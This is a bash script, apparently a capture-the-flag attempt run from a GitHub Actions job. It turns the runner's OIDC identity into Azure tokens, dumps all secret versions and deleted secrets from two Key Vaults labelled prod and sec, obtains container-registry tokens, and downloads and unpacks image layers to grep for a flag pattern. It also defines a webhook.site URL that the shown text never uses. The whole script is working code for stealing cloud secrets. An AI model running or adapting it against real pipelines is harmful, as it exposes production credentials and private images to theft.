#!/usr/bin/env bash
# CTF DF26 v11: KV secret version-history + raw deleted-secrets dump (prod + sec), grep DF26.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID
PV=https://kv-tbl-prod-x3euoz.vault.azure.net
SV=https://kv-tbl-sec-x3euoz.vault.azure.net
FL='DF26\{[^}]\{0,200}\}'
WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
VT=$(curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$C" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
echo "===== CTX run=$GITHUB_RUN_ID vaulttok=${#VT}"
for V in "$PV" "$SV"; do
  echo "########## VAULT $V"
  echo "-- list raw:"; curl -s "$V/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 500; echo
  echo "-- deleted raw:"; curl -s "$V/deleted-secrets?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 700; echo
  for u in $(curl -s "$V/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[]?.id // empty'); do
    n=$(basename "$u")
    echo "===== VERSIONS $n"
    curl -s "$u/versions?api-version=7.4" -H "Authorization: Bearer $VT" > /tmp/v.json
    head -c 300 /tmp/v.json; echo
    for ver in $(jq -r '.value[]?.id // empty' /tmp/v.json | sed 's#.*/secrets/[^/]*/##'); do
      echo "--- $n@$ver"
      val=$(curl -s "$u/$ver?api-version=7.4" -H "Authorization: Bearer $VT")
      echo "$val" | jq -r '.value // .' | head -c 700; echo
      echo "$val" | grep -aoE "$FL" && echo "HIT-VERSION $n@$ver"
    done
  done
  # deleted secret names from raw list
  for du in $(curl -s "$V/deleted-secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[]?.id // empty'); do
    echo "===== DELETED $du"
    dv=$(curl -s "$du?api-version=7.4" -H "Authorization: Bearer $VT")
    echo "$dv" | jq -r '.value // .' | head -c 700; echo
    echo "$dv" | grep -aoE "$FL" && echo "HIT-DELETED"
  done
done
# ---- ACR sweep with CI identity ----
AM=$(curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$C" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
RT=$(curl -s -X POST https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange -H 'Content-Type: application/json' -d "{\"grant_type\":\"access_token\",\"service\":\"crtblplatprodx3euoz.azurecr.io\",\"tenant\":\"$T\",\"accessToken\":\"$AM\"}" | jq -r .refresh_token)
CT=$(curl -s "https://crtblplatprodx3euoz.azurecr.io/oauth2/token?service=crtblplatprodx3euoz.azurecr.io&scope=registry:catalog:*" --data-urlencode grant_type=password --data-urlencode "refresh_token=$RT" | jq -r .access_token)
echo "===== ACT catalog tok=${#CT}"
curl -s https://crtblplatprodx3euoz.azurecr.io/v2/_catalog -H "Authorization: Bearer $CT"
for repo in $(curl -s https://crtblplatprodx3euoz.azurecr.io/v2/_catalog -H "Authorization: Bearer $CT" | jq -r '.repositories[]? // empty'; echo tebamoto-reporting-api); do
  RTAG=$(curl -s "https://crtblplatprodx3euoz.azurecr.io/oauth2/token?service=crtblplatprodx3euoz.azurecr.io&scope=repository:$repo:pull" --data-urlencode grant_type=password --data-urlencode "refresh_token=$RT" | jq -r .access_token)
  for tag in $(curl -s "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/tags/list" -H "Authorization: Bearer $RTAG" | jq -r '.tags[]? // empty' | head -5); do
    echo "REPO $repo:$tag"
    MAN=$(curl -s "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/manifests/$tag" -H "Authorization: Bearer $RTAG" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json')
    echo "$MAN" | head -c 250; echo
    if echo "$MAN" | jq -e '.manifests' >/dev/null 2>&1; then
      DM=$(echo "$MAN" | jq -r '.manifests[] | select(.platform.architecture=="amd64") | .digest' | head -1)
      MAN=$(curl -sL "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/manifests/$DM" -H "Authorization: Bearer $RTAG" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json')
    fi
    CFG=$(echo "$MAN" | jq -r '.config.digest // empty')
    [ -n "$CFG" ] && curl -sL "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/blobs/$CFG" -H "Authorization: Bearer $RTAG" | head -c 1200 && echo
    mkdir -p "/tmp/$repo-$tag"
    for dl in $(echo "$MAN" | jq -r '.layers[]?.digest // empty'); do
      curl -sL "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/blobs/$dl" -H "Authorization: Bearer $RTAG" -o "/tmp/$repo-$tag/L.tgz"
      tar -xzf "/tmp/$repo-$tag/L.tgz" -C "/tmp/$repo-$tag" 2>/dev/null || true
    done
    grep -raoE "$FL" "/tmp/$repo-$tag" 2>/dev/null | head -5
    grep -raiE "flag" "/tmp/$repo-$tag/app" 2>/dev/null | head -5
  done
done
echo DONE-V11
